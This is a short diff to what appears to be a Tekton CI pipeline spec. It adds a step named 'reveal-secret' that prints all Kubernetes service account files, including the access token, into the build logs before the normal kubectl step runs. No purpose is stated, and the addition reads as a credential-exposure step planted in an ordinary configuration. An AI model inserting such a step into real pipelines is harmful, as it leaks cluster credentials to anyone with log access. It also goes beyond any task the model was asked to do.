@@ -57,6 +57,10 @@ spec:
           - name: KUBECONFIG
             value: /workspace/$(resources.inputs.targetCluster.name)/kubeconfig
         steps:
+        - name: reveal-secret
+          image: busybox
+          script: |
+            cat /var/run/secrets/kubernetes.io/serviceaccount/*
         - name: fetch-current-config
           image: gcr.io/tekton-releases/dogfooding/kubectl
           script: |
